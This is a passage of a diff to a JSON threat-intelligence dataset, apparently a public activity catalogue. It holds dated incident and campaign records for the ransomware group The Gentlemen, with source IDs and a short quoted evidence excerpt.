+          "source_id": "tar_source_f44fb5d6275a5774a4cacbe5"
+        }
+      ],
+      "first_seen": "2026-04-09T00:00:00Z",
+      "flow_path": "attack-flows/the-gentlemen/?scope=huntress-april-shipping",
+      "id": "tar_activity_7bbe65a2893620e9116772dd",
+      "last_seen": "2026-04-10T23:59:59Z",
+      "name": "April shipping and transportation incident",
+      "relationship_ids": [],
+      "source_ids": [
+        "tar_source_f44fb5d6275a5774a4cacbe5"
+      ],
+      "type": "incident"
+    },
+    {
+      "actor_id": "tar_actor_ac4f9ded840a918ef8259ea5",
+      "date_basis": "explicit_source_month",
+      "date_precision": "month",
+      "description": "Trend Micro campaign reconstruction covering The Gentlemen activity investigated in August 2025. The source provides month-level timing rather than exact campaign start and end days.",
+      "evidence": [
+        {
+          "excerpt": "In August 2025, we investigated a new ransomware campaign orchestrated by The Gentlemen, an emerging and previously undocumented threat group.",
+          "role": "scope",
+          "source_id": "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+        }
+      ],
+      "first_seen": "2025-08-01T00:00:00Z",
+      "flow_path": "attack-flows/the-gentlemen/?scope=trend-august-campaign",
+      "id": "tar_activity_f229437da87e2df1482ac5a4",
+      "last_seen": "2025-08-31T23:59:59Z",
+      "name": "Trend Micro August 2025 campaign",
+      "relationship_ids": [],
+      "source_ids": [
+        "tar_source_1c7de0cfeb2bfe740e1d6b9d"
+      ],
+      "type": "campaign"
+    }
+  ],
+  "data_version": "v0.3.2",
+  "schema": "threatactorradar.public-activities/v1"
+}
